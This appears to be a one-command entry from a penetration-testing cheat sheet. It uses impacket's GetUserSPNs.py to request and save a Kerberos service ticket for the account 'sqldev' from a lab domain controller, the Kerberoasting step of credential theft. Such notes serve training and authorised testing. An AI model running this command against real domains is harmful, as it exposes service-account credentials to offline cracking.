# Save Kerberos Ticket to Output File

OS: Active_Directory, Linux
Description: Save Kerberos Ticket to Specific File
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
GetUserSPNs.py -dc-ip 172.16.5.5 TARGETDOMAIN.LOCAL/ -request-user sqldev -outputfile sqldev_tgs
```